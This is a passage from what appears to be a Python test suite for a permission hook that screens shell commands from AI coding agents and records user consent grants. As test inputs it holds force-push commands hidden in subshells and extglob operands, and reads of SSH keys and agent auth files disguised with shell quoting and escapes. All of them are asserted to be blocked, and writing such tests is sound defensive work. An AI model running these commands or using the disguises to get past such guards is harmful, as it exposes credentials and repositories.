                            "printf x > ''; git push --force origin main"):
                with self.subTest(command=command):
                    marker.unlink(missing_ok=True)
                    baseline = subprocess.run(['bash', '--noprofile', '--norc', '-c',
                        'git() { printf executed > ' + str(marker) + '; }; ' + command],
                        cwd=root, capture_output=True, text=True, timeout=10,
                        env={**os.environ, 'BASH_ENV': '/dev/null'})
                    self.assertEqual(0, baseline.returncode, baseline.stderr)
                    self.assertEqual('executed', marker.read_text())
                    self.assertIn(['git', 'push', '--force', 'origin', 'main'],
                                  [segment.words for segment in segments(command)])
                    for executor in ('claude', 'codex'):
                        for role in ('resolve', 'rereview'):
                            policy = self.rev014_grant(role, executor)
                            # `> ""` is itself refused by the redirect guard; the
                            # separate `git push` segment keeps its own guard.
                            self.assertIsNotNone(sp.protected_reason('Bash', {'command': command}, policy, root))
                            self.assertIn('git', str(sp.protected_reason(
                                'Bash', {'command': 'git push --force origin main'}, policy, root)).lower())
                            self.assertFalse(sp.check(command, policy, cwd=root).allowed)

    @posix_shell
    def test_rev012_extglob_data_and_negated_subshells_are_distinct(self):
        policy = sp.StagePolicy("resolve")
        for command in ("!(git push --force origin main)", "true; !(git push --force origin main)",
                        "time -- !(git push --force origin main)",
                        "time -p -- !(git push --force origin main)",
                        "if !(git push --force origin main); then true; fi",
                        "while !(git push --force origin main); do true; done",
                        "cat @(x|$(git push --force origin main))",
                        "cat @(x|`git push --force origin main`)"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        for operand in ("@(a;git push --force origin main)", "@(x|foo bar)",
                        "@(x|foo>bar)", "!(x|foo bar)"):
            command = "printf '%s' " + operand
            with self.subTest(operand=operand):
                self.assertEqual([["printf", "%s", operand]],
                                 [segment.words for segment in sp.parse_command(command, None).segments])
                self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, None))
                current, _ = self.approved(policy, command)
                self.assertTrue(sp.check(command, current).allowed)

    @posix_shell
    def test_shell_quoting_and_continuations_reach_the_guard_decoded(self):
        policy = sp.StagePolicy("resolve")
        home = str(Path.home())
        for command in (f"cat $'{home}/.ssh/id_rsa'", f"cat $'{home}/.s\\x73h/id_rsa'",
                        f'cat $"{home}/.codex/auth.json"', "cat ~/.s\\\nsh/id_rsa",
                        f'cat "{home}/.co\\\ndex/auth.json"', f"cat {home}/.codex$'\\u2f'auth.json",
                        "cat ~/$'\\u2e'ssh/id_rsa", f"cat {home}/.s$'\\c@'sh/id_rsa",
                        f"cat {home}/.s$'s\\0x'h/id_rsa", f"cat $\\\n'{home}/.ssh/id_rsa'",
                        "cat $HO\\\nME/.ssh/id_rsa", "cat ${HO\\\nME}/.codex/auth.json"):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)
        self.assertEqual([["printf", "a\nb"]], [item.words for item in sp.parse_command("printf $'a\\nb' | cat",
                                                                                         None).segments][:1])
        for safe in ("printf $'%s\\n' done", "echo first \\\n  second", "printf $'\\x \\E[0m\\c'",
                     "find . -print0 | while IFS= read -r -d $'\\0' f; do echo \"$f\"; done",
                     "printf '%s' $'\\x00' | cat", "# note \\\ncat README.md"):
            with self.subTest(command=safe), warnings.catch_warnings():
                warnings.simplefilter("error")
                self.assertIsNone(sp.protected_reason("Bash", {"command": safe}, policy, None))

    @posix_shell
    def test_unresolved_directory_asks_for_project_paths_below_it(self):
        # Code loaders and variable targets make the directory unknown; a
        # nested project path still names no credential store, so it asks.
        for role in ("resolve", "rereview"):
            with self.subTest(role=role), tempfile.TemporaryDirectory() as root:
                policy = sp.StagePolicy(role, tmpdir=root)
                for command in ("source .venv/bin/activate && pytest tests/cli/test_main.py",
                                'eval "$(pyenv init -)" && rm -rf build/*', 'cd "$X" && ls src/*',
                                ". venv/bin/activate && cat app/config/settings.py",
                                'cd "$X" && cat .github/workflows/*.yml',
                                "source .venv/bin/activate && rm -rf build/cache/*",
                                'cd "$X" && cp -r cli/templates "$TMPDIR/t"'):
                    with self.subTest(command=command):
                        self.assertIsNone(sp.protected_reason("Bash", {"command": command}, policy, root))
                        self.assertTrue(sp.unresolved_directory(command, policy, root))
                        current, _ = self.approved(policy, command, cwd=root)
                        self.assertTrue(sp.check(command, current, cwd=root).allowed)
        policy = sp.StagePolicy("resolve")
        for command in ('cd "$X" && cat keys/id_rsa', 'cd "$X" && cat certs/server.pem',
                        "source x.sh && cat .ssh/*", 'cd "$X" && cat aws/sso/cache/t.json',
                        'cd "$X" && cp -r sso/cache "$TMPDIR/c"', 'cd "$X" && cat keys/*rsa',
                        'cd "$X" && cat sub/id*', 'cd "$X" && cat x/*pem', 'cd "$X" && cat cache/*'):
            with self.subTest(command=command):
                current, _ = self.approved(policy, command)
                self.assertIsNotNone(sp.protected_reason("Bash", {"command": command}, current, None))
                self.assertFalse(sp.check(command, current).allowed)

    def test_rev004_invalid_answers_retry_without_saving_rejected_grants(self):
        for role in ("resolve", "rereview"):
            with self.subTest(role=role), tempfile.TemporaryDirectory() as root:
                store = grants.ConsentStore(Path(root) / "consents.json")
                command = "cat /outside/api/schema.json"
                bad = {"answer": "persistent", "pattern": "[", "positive": [command], "negative": ["rm x"]}
                unrelated = {"answer": "persistent", "pattern": r"ls /outside/.+",
                             "positive": ["ls /outside/api"], "negative": ["rm x"]}
                responses = [bad, unrelated]
                responses.append({"answer": "persistent", "pattern": r"cat .+", "positive": 1,
                                  "negative": ["rm x"]})
                if role == "rereview":
                    responses.append({"answer": "forever"})
                responses.append("persistent")
                questions = []
                def prompt(asked):
                    questions.append(asked)
                    self.assertEqual([], store.list("owner/repo"))
                    return responses.pop(0)
                broker = grants.ConsentBroker("owner/repo", platform="linux", store=store, prompt=prompt)
                request = cp.refused_operation([command], sp.StagePolicy(role), broker, "claude")
                grant = broker.operations[request["resource"]]
                self.assertEqual("persistent", broker.request(grant, "claude", role=role, blocker=request))
                self.assertIn("invalid pattern", questions[1]["validation_error"])
                self.assertIn("does not cover", questions[2]["validation_error"])
                self.assertIn("non-empty lists", questions[3]["validation_error"])
                if role == "rereview":
                    self.assertIn("global grant never covers", questions[4]["validation_error"])
                self.assertEqual(1, len(store.list("owner/repo")))
                self.assertEqual(1, len(broker.operations))

    def test_rev004_terminal_json_error_then_eof_leaves_request_pending(self):
        command = "cat /outside/api/schema.json"
        output = io.StringIO()
        prompt = grants.terminal_prompt(io.StringIO('{"answer":"forever"}\n'), output)
        broker = grants.ConsentBroker("owner/repo", platform="linux", prompt=prompt)
        request = cp.refused_operation([command], sp.StagePolicy("rereview"), broker, "claude")
        grant = broker.operations[request["resource"]]
        self.assertEqual(grants.PENDING, broker.request(grant, "claude", role="rereview", blocker=request))
        self.assertIn("global grant never covers", output.getvalue())
        self.assertEqual(1, len(broker.pending))

    @posix_shell
    def test_ac10_patterns_never_lift_protected_guards(self):
        policy = sp.StagePolicy("rereview", tmpdir="/tmp/current")
        current, grant = self.approved(policy, "ls /outside/api", r"(?:git|cat|echo|ls) .+")
        for command in ("git push --force origin main", "cat ~/.codex/auth.json", "echo data > /outside/file"):
            self.assertFalse(sp.check(command, current).allowed)
            self.assertIsNone(sp.matching_answer("Bash", {"command": command}, current, None))

    def test_ac11_hook_label_and_host_note(self):
        with tempfile.TemporaryDirectory() as root:
            policy = sp.StagePolicy("resolve", tmpdir=root)
            path = Path(root) / "policy.json"
            path.write_text(policy.to_json())
            output = io.StringIO()
            sp.hook_main([str(path)], stdin=io.StringIO(json.dumps({
                "tool_name": "Bash", "tool_input": {"command": "unknown-command"}})), stdout=output)
            self.assertIn("[layer=toolkit_hook]", output.getvalue())
            self.assertIn("unlabelled refusal", sp.prompt_note(policy))

    @posix_shell
    def test_ac7_ac9_pattern_proposal_edited_approval_and_real_hook(self):
        with tempfile.TemporaryDirectory() as root:
            store = grants.ConsentStore(Path(root) / "consents.json")
            policy = sp.StagePolicy("resolve", tmpdir=root)
            command = "cat /outside/api/schema.json"
            proposal = {"pattern": r"cat /outside/api/.+", "proposer": "agent",
                        "justification": "inspect API contract", "positive": [command],
                        "negative": ["cat /outside/secrets"]}
            broker = grants.ConsentBroker("owner/repo", store=store, platform="linux",
                prompt=lambda question: {"answer": "persistent", "pattern": r"(?:ls|cat) /outside/api[/a-z.]*",
                    "positive": [command], "negative": ["cat /outside/secrets"]})
            request = cp.refused_operation([{"tool": "Bash", "input": {"command": command},
                "pattern_proposal": proposal}], policy, broker, "claude")
            grant = broker.operations[request["resource"]]
            self.assertEqual(2, grant.operation["version"])
            self.assertEqual("persistent", broker.request(grant, "claude", role="resolve", blocker=request))
            current = replace(policy, command_permissions=broker.command_entries("claude", "resolve"))
            policy_path = Path(root) / "policy.json"
            policy_path.write_text(current.to_json())
            for command, allowed in (("ls /outside/api/", True), ("cat /outside/secrets", False)):
                completed = subprocess.run([sys.executable, str(Path(sp.__file__)), "hook", str(policy_path)],
                    input=json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": root}),
                    capture_output=True, text=True)
                self.assertEqual(0, completed.returncode)
                self.assertEqual(allowed, completed.stdout == "", completed.stdout)
            broker.record_executions(["ls /outside/api/"], "claude", current, root)
            entries = store.list("owner/repo")
            self.assertEqual(1, len(entries))
            self.assertEqual("ls /outside/api/", entries[0]["executed_commands"][0]["command"])

    def test_ac11_layer_records_include_both_executors(self):
        for executor in ("claude", "codex"):
            records = cp.denial_records([{"tool": "Bash", "input": {"command": "ls /outside/api"},
                "layer": executor + "_permission"}], sp.StagePolicy("resolve"), executor)
            self.assertEqual(executor + "_permission", records[0]["layer"])

    @posix_shell
    def test_ac9_execution_audit_keeps_verified_temporary_identity_after_cleanup(self):
        with tempfile.TemporaryDirectory() as root:
            scratch = Path(root) / "dispatch"
            scratch.mkdir()
            policy = sp.StagePolicy("resolve", tmpdir=str(scratch))
            command = "cat $TMPDIR/output"
            op = sp.operation("Bash", {"command": command}, policy, root)
            grant = grants.make_pattern_grant(r"cat <TMPDIR>/.+", "resolve", "claude", "linux",
                proposer="agent", justification="read check output", positive=["cat <TMPDIR>/output"],
                negative=["cat /outside/file"])
            store = grants.ConsentStore(Path(root) / "consents.json")
            store.save("owner/repo", grant, grant.scopes[0], "allow")
            scratch.rmdir()
            broker = grants.ConsentBroker("owner/repo", store=store, platform="linux")
            broker.record_executions([command], "claude", replace(policy, tmpdir=None), root,
                                     observed=[{"command": command, "operation": op}])
            self.assertEqual(command, store.list("owner/repo")[0]["executed_commands"][0]["command"])

    def test_ac12_documentation_contract(self):
        root = Path(__file__).resolve().parents[1]
        # The docs are UTF-8 (`Í`, `←`); Windows' default code page cannot decode them.
        text = (root / "docs/host-permissions.md").read_text(encoding="utf-8")
        for token in ("command_pattern_proposals", "positive", "negative", "toolkit_hook", "#439"):
            self.assertIn(token, text)
        audit = (root / "docs/capability-parity-audit.md").read_text(encoding="utf-8")
        self.assertIn("PA-19", audit)
        self.assertIn("#439", audit)
        self.assertIn("#455", (root / "docs/ROADMAP_V2.md").read_text(encoding="utf-8"))

    # --- AC-13 / AC-14: the session's tool-results directory (REV-017, REV-018)

    def sessions(self, home):
        """Two Claude sessions of one review project, each with a saved output."""
        project = Path(home, ".claude", "projects", "-tmp-code-cycle-review-abc123")
        files = {}
        for session in ("11111111-aaaa", "22222222-bbbb"):
            results = project / session / "tool-results"
            results.mkdir(parents=True)
            (project / f"{session}.jsonl").write_text("", encoding="utf-8")
            files[session] = results / f"out-{session[:4]}.txt"
            files[session].write_text("line\n", encoding="utf-8")
        return project, files

    def run_hook(self, policy, command, cwd, project, session):
        path = Path(cwd, "policy.json")
        path.write_text(policy.to_json(), encoding="utf-8")
        event = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": cwd,
                 "session_id": session, "transcript_path": str(project / f"{session}.jsonl")}
        completed = subprocess.run([sys.executable, str(Path(sp.__file__)), "hook", str(path)],
                                   input=json.dumps(event), capture_output=True, text=True)
        self.assertEqual(0, completed.returncode, completed.stderr)
        return completed.stdout

    def marker(self, output, name):
        tag = f"COMMAND_PERMISSION_{name}="

        def texts(value):
            if isinstance(value, str):
                yield value
            elif isinstance(value, dict):
                for item in value.values():
                    yield from texts(item)
        reason = next(text for text in texts(json.loads(output)) if tag in text)
        value, _ = json.JSONDecoder().raw_decode(reason[reason.rfind(tag) + len(tag):])
        return value

    def test_ac13_session_tool_results_directory_comes_only_from_the_host_event(self):
        # A rooted path without a drive letter is not absolute on Windows, so
        # build the project directory from the platform's own root.
        project = Path(os.path.abspath(os.sep), "srv", "agent", ".claude", "projects", "-tmp-x")
        transcript = str(project / "abc-1.jsonl")
        self.assertEqual(str(project / "abc-1" / "tool-results"),
                         sp.session_tool_results({"session_id": "abc-1", "transcript_path": transcript}))
        for event in ({"session_id": "other", "transcript_path": transcript},
                      {"session_id": "abc-1", "transcript_path": "projects/abc-1.jsonl"},
                      {"session_id": "../abc-1", "transcript_path": "/p/../abc-1.jsonl"},
                      {"session_id": "abc-1"}, None):
            with self.subTest(event=event):
                self.assertIsNone(sp.session_tool_results(event))

    @posix_shell
    def test_ac13_own_session_reads_ask_nothing_and_another_session_still_asks(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as root:
            project, files = self.sessions(home)
            outside = Path(home, "outside.txt")
            outside.write_text("secret\n", encoding="utf-8")
            (files["11111111-aaaa"].parent / "link.txt").symlink_to(outside)
            for role in ("resolve", "rereview"):
                # Two dispatches of the same stage: new $TMPDIR and new session each.
                for own, other in (("11111111-aaaa", "22222222-bbbb"), ("22222222-bbbb", "11111111-aaaa")):
                    scratch = Path(root, f"tmp-{own[:4]}")
                    scratch.mkdir(exist_ok=True)
                    policy = sp.StagePolicy(role, tmpdir=str(scratch))
                    for command in (f'grep -c "" {files[own]}', f"grep -n -E 'li.e' {files[own]}",
                                    f"wc -l {files[own]}", f"cat {files[own].parent}/../tool-results/{files[own].name}"):
                        with self.subTest(role=role, session=own, command=command):
                            self.assertEqual("", self.run_hook(policy, command, root, project, own))
                    command = f'grep -c "" {files[other]}'
                    with self.subTest(role=role, session=own, other=other):
                        output = self.run_hook(policy, command, root, project, own)
                        self.assertIn("reading outside the stage workspace needs operation consent", output)
                        self.assertIn("[layer=toolkit_hook]", output)
                    with self.subTest(role=role, symlink="escape"):
                        link = files["11111111-aaaa"].parent / "link.txt"
                        output = self.run_hook(policy, f"cat {link}", root, project, "11111111-aaaa")
                        self.assertIn("reading outside the stage workspace", output)

    @posix_shell
    def test_ac13_ac14_grant_from_an_earlier_dispatch_matches_the_later_session(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as root:
            project, files = self.sessions(home)
            first, second = Path(root, "tmp-first"), Path(root, "tmp-second")
            first.mkdir()
            second.mkdir()
            store = grants.ConsentStore(Path(home) / "consents.json")
            for template in ('grep -n line {file} | head -n 5', 'wc -l {file} > {tmp}/check.log'):
                for role in ("resolve", "rereview"):
                    with self.subTest(template=template, role=role):
                        policy = sp.StagePolicy(role, tmpdir=str(first))
                        command = template.format(file=files["11111111-aaaa"], tmp=first)
                        output = self.run_hook(policy, command, root, project, "11111111-aaaa")
                        self.assertIn("[layer=toolkit_hook]", output)
                        refusal = {"tool": "Bash", "input": {"command": command}, "tmpdir": str(first),
                                   "operation": self.marker(output, "OPERATION"),
                                   "tool_results": self.marker(output, "TOOL_RESULTS")}
                        self.assertIn(sp.TOOL_RESULTS_OPERAND, sp.normalized_command(refusal["operation"]))
                        broker = grants.ConsentBroker("owner/repo", store=store, platform="linux")
                        request = cp.refused_operation([refusal], policy, broker, "claude", root)
                        self.assertIsNotNone(request)
                        self.assertEqual(self.marker(output, "ID"), request["resource"])
                        grant = broker.operations[request["resource"]]
                        asked = grants.question(grant, grant.scopes[0], role=role, blocker=request)
                        self.assertIn("this repository", asked["options"])
                        self.assertEqual("persistent", broker.apply_answer(grant, grant.scopes[0], "persistent"))
                        later = replace(sp.StagePolicy(role, tmpdir=str(second)),
                                        command_permissions=grants.ConsentBroker(
                                            "owner/repo", store=store, platform="linux").command_entries("claude", role))
                        command = template.format(file=files["22222222-bbbb"], tmp=second)
                        self.assertEqual("", self.run_hook(later, command, root, project, "22222222-bbbb"))
                        # The earlier session's file is another session's directory now.
                        command = template.format(file=files["11111111-aaaa"], tmp=second)
                        self.assertIn("[layer=toolkit_hook]",
                                      self.run_hook(later, command, root, project, "22222222-bbbb"))

    @posix_shell
    def test_ac14_dispatch_unique_operands_are_offered_this_cycle_only(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as root:
            project, files = self.sessions(home)
            current = Path(root, "code-cycle-tmp-current")
            current.mkdir()
            unique = (f"cat {files['22222222-bbbb']}",
                      "cat /tmp/code-cycle-tmp-old123/claude-1000/report.md",
                      "ls /tmp/code-cycle-review-zz9/scripts/",
                      "python3 -c 'print(1)' /tmp/code-cycle-tmp-old123/x")
            ordinary = ("cat /outside/api/contract.json", "ls /srv/shared/data/")
            for role in ("resolve", "rereview"):
                policy = replace(sp.StagePolicy(role, tmpdir=str(current)),
                                 tool_results=str(files["11111111-aaaa"].parent))
                for command in (*unique, *ordinary):
                    with self.subTest(role=role, command=command):
                        store = grants.ConsentStore(Path(home) / f"consents-{role}.json")
                        broker = grants.ConsentBroker("owner/repo", store=store, platform="linux")
                        request = cp.refused_operation([command], policy, broker, "claude", root)
                        self.assertIsNotNone(request)
                        grant = broker.operations[request["resource"]]
                        asked = grants.question(grant, grant.scopes[0], role=role, blocker=request)
                        if command in unique:
                            self.assertEqual(["this cycle", "deny"], asked["options"])
                            self.assertIn("unique to one dispatch or session", asked["prompt"])
                            self.assertIn("could never match again", asked["prompt"])
                            self.assertIn("dispatch_unique_path",
                                          grants.PermissionRequest(grant, grant.scopes[0], role, asked, request).record())
                            # A stored answer is kept for this cycle, never refused.
                            for answer in ("persistent", "forever"):
                                self.assertEqual("cycle", broker.apply_answer(grant, grant.scopes[0], answer))
                            self.assertEqual([], store.list("owner/repo"))
                            self.assertEqual([], store.list("*"))
                            self.assertTrue(any("kept for this cycle only" in note for note in broker.notes))
                        else:
                            self.assertIn("this repository", asked["options"])
                            self.assertNotIn("unique to one dispatch", asked["prompt"])
            # The current dispatch's $TMPDIR and session directory are placeholders, so matchable.
            policy = replace(sp.StagePolicy("resolve", tmpdir=str(current)),
                             tool_results=str(files["11111111-aaaa"].parent))
            for command in (f"python3 -c 'print(1)' {files['11111111-aaaa']}",
                            f"python3 -c 'print(1)' {current}/report.md"):
                with self.subTest(command=command):
                    self.assertIsNone(sp.dispatch_unique_path(sp.operation("Bash", {"command": command}, policy, root)))

    @posix_shell
    def test_ac13_ac14_edges_tilde_mounts_markers_grant_answers_and_root_symlinks(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as root:
            project, files = self.sessions(home)
            own = files["11111111-aaaa"]
            policy = replace(sp.StagePolicy("resolve", tmpdir=root), tool_results=str(own.parent))
            # `~/…` names the same saved output for the hook and the identity.
            with patch.dict(os.environ, {"HOME": home}):
                tilde = "~/" + own.relative_to(home).as_posix()
                for command in (f"cat {tilde}", f"grep -n line {tilde} | head -n 1", f"sort {tilde}"):
                    with self.subTest(command=command):
                        op = sp.operation("Bash", {"command": command}, policy, root)
                        self.assertIn(sp.TOOL_RESULTS_OPERAND, sp.normalized_command(op), op)
                        self.assertIsNone(sp.dispatch_unique_path(op))
            # A mount or option value is a dispatch-unique path too.
            for command in ("docker run -v /tmp/code-cycle-review-abc:/src image",
                            "tool --input=/tmp/code-cycle-tmp-old/x,/y", "ls [/tmp/code-cycle-tmp-old]"):
                with self.subTest(command=command):
                    self.assertIsNotNone(sp.dispatch_unique_path(
                        {"version": 1, "tool": "Bash", "role": "resolve",
                         "pattern": {"words": command.split(), "redirects": []}}))
            self.assertIsNone(sp.dispatch_unique_path(
                {"version": 1, "tool": "Bash", "role": "resolve",
                 "pattern": {"words": ["ls", "/srv/my-code-cycle-tmp-x/", "/a/" * 5000], "redirects": []}}))
            # A printed marker of another shape cannot name a directory.
            for value in (home, str(Path(home, "tool-results")), str(own.parent) + "/../tool-results"):
                with self.subTest(marker=value):
                    self.assertIsNone(cp._observed_policy(policy, {"tool_results": value}).tool_results)
            self.assertEqual(str(own.parent), cp._observed_policy(policy, {"tool_results": str(own.parent)}).tool_results)
            # A tool-results directory that is a symlink elsewhere covers nothing.
            fake = Path(home, ".claude", "projects", "p", "33333333-cccc")
            fake.mkdir(parents=True)
            (fake / "tool-results").symlink_to(home)
            linked = replace(policy, tool_results=str(fake / "tool-results"))
            self.assertFalse(sp.inside_tool_results(str(fake / "tool-results" / "outside.txt"), linked))
            # `--grant id=persistent` for a unique operation reports and keeps a cycle answer.
            command = f"cat {files['22222222-bbbb']}"
            broker = grants.ConsentBroker("owner/repo", platform="linux",
                                          store=grants.ConsentStore(Path(home) / "consents.json"))
            request = cp.refused_operation([command], policy, broker, "claude", root)
            grant = broker.operations[request["resource"]]
            broker = grants.ConsentBroker("owner/repo", platform="linux", store=broker.store,
                                          answers={grant.id: "persistent"},
                                          asked=frozenset({grant.fingerprint(grant.scopes[0])}))
            self.assertEqual("cycle", broker.request(grant, "claude", role="resolve", blocker=request))
            self.assertEqual([], broker.store.list("owner/repo"))
            asked = grants.question(grant, grant.scopes[0], role="resolve", blocker=request)
            self.assertNotIn(sp.TOOL_RESULTS_OPERAND, asked["prompt"])
            saved = sp.operation("Bash", {"command": f"sort {own}"}, policy, root)
            asked = grants.question(grants.make_grant(saved, "claude", "linux"),
                                    grants.make_grant(saved, "claude", "linux").scopes[0], role="resolve")
            self.assertIn("matches any saved output of the current session", asked["prompt"])
            self.assertIn("this repository", asked["options"])

    def test_ac13_prompt_note_tells_the_reviewer_how_to_read_large_outputs(self):
        for role in ("review", "rereview", "resolve"):
            note = sp.prompt_note(sp.StagePolicy(role))
            self.assertIn("Read large outputs in smaller pieces", note)
            self.assertIn("$TMPDIR", note)
            self.assertIn("tool-results", note)


if __name__ == "__main__":
    unittest.main()
